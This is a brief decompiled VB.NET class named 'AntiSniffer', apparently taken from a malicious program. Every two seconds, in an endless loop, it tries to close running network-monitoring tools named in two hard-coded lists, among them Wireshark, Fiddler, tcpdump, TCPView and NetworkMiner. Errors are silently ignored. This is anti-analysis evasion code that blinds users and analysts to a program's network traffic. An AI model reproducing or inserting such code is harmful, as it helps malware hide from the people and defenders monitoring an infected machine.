Imports System
Imports System.Collections.Generic
Imports System.Threading

Namespace Main.Tools
	' Token: 0x02000019 RID: 25
	Public Class AntiSniffer
		' Token: 0x0600009C RID: 156 RVA: 0x000074EC File Offset: 0x000056EC
		Public Shared Sub sniffersKiller()
			While True
				Try
					For i As Integer = 0 To AntiSniffer.AppFilter.Count - 1
						Dim num As Integer = i
						For j As Integer = 0 To AntiSniffer.DumpFilter.Count - 1
							Dim num2 As Integer = j
							ProcessKiller.ClosingCycle(AntiSniffer.AppFilter(num), AntiSniffer.DumpFilter(num2))
						Next
					Next
				Catch
				End Try
				Thread.Sleep(2000)
			End While
		End Sub

		' Token: 0x0400009E RID: 158
		Private Shared AppFilter As List(Of String) = New List(Of String)() From { "http analyzer stand-alone", "fiddler", "effetech http sniffer", "firesheep", "IEWatch Professional", "dumpcap", "wireshark", "wireshark portable", "sysinternals tcpview" }

		' Token: 0x0400009F RID: 159
		Private Shared DumpFilter As List(Of String) = New List(Of String)() From { "NetworkMiner", "NetworkTrafficView", "HTTPNetworkSniffer", "tcpdump", "intercepter", "Intercepter-NG" }
	End Class
End Namespace
